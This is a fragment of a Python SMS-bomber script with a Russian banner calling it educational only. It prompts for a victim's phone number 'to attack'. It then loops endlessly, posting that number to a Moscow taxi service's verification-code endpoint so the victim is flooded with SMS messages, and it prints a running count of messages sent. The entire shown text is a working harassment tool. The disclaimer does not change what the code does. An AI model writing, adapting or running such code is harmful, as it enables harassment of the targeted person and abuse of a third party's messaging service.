...
|                                                               |
|  ПРЕДУПРЕЖДЕНИЕ! ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНОЙ ЦЕЛИ! |
...
print(banner)
_phone = input('Введите номер для атаки (Без +)-->> ')
...
while True:
	...
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone}).json()["res"]
		print('[+] Отправлено!')
	except:
		print('[-] Не отправлено!')
	...
	try:
		iteration += 50
		print(('{} Сообщений отправлено.').format(iteration))
	except:
		break